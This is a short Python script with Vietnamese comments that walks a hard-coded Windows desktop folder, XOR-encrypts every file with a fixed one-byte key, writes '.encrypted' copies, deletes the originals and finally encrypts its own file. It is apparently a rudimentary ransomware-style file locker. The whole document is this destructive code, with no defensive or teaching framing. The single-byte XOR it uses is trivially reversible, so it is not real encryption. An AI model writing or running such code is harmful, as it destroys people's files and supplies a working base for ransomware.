import os
import sys
# Hàm mã hóa tệp
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            plaintext = f.read()

        ciphertext = bytearray(plaintext)
        for i in range(len(ciphertext)):
            ciphertext[i] ^= key

        with open(file_path + ".encrypted", 'wb') as f:
            f.write(ciphertext)
        
        os.remove(file_path)
    except Exception as e:
        print("Error:", str(e))

# Khóa mã hóa
key = 0x42

# Thư mục mục tiêu
target_directory = r"C:\Users\asus\Desktop\cc"

# Mã hóa tất cả các tệp trong thư mục
for root, dirs, files in os.walk(target_directory):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(file_path, key)

encrypt_file(sys.argv[0], key)
